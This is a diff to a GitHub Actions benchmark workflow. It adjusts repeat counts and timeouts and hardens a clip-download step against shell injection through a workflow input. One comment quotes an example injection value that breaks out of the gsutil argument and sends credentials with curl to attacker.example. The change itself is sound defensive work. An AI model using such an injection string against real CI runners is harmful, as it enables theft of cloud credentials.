@@ -36,13 +36,18 @@ on:
       bench_repeats:
         description: "Trials per template per render path (benchmark only)"
         required: false
-        default: "3"
+        default: "1"
         type: string
 
 jobs:
   parity-and-bench:
     runs-on: ubuntu-latest
-    timeout-minutes: 60
+    # 4 fixtures (impressing-myself, just-fine, dimples-passport, rule-of-thirds)
+    # × 2 render paths × N trials at libx264 fast 1080x1920 on a 2-vCPU runner is
+    # ~3-4 min per encode pair for the heavier fixtures. Default BENCH_REPEATS=1
+    # keeps total runtime under 60 min. Bump bench_repeats on the dispatch form
+    # when you want tighter median bands and accept a 90+ min run.
+    timeout-minutes: 90
     steps:
       - uses: actions/checkout@v4
 
@@ -72,9 +77,21 @@ jobs:
         uses: google-github-actions/setup-gcloud@v2
 
       - name: Download reference clips
+        env:
+          # Pass workflow_dispatch input through env: so it never reaches the
+          # shell as a template substitution. Stops ${{ inputs.clips_gcs_uri }}
+          # from breaking out of the quoted gsutil argument (a value like
+          # `gs://x/" /tmp/; curl -d @creds attacker.example; echo "` would
+          # otherwise execute against the GCP-authenticated runner).
+          CLIPS_URI: ${{ inputs.clips_gcs_uri }}
         run: |
+          # Defense in depth: validate the input shape before use.
+          if [[ ! "$CLIPS_URI" =~ ^gs://[a-zA-Z0-9._/-]+$ ]]; then
+            echo "ERROR: clips_gcs_uri must match ^gs://[a-zA-Z0-9._/-]+$ — got '$CLIPS_URI'"
+            exit 1
+          fi
           mkdir -p /tmp/parity-clips
-          gsutil -m cp "${{ inputs.clips_gcs_uri }}*.mp4" /tmp/parity-clips/
+          gsutil -m cp "${CLIPS_URI%/}/"*.mp4 /tmp/parity-clips/
           echo "Downloaded $(ls /tmp/parity-clips | wc -l) clips."
           ls -lh /tmp/parity-clips
 
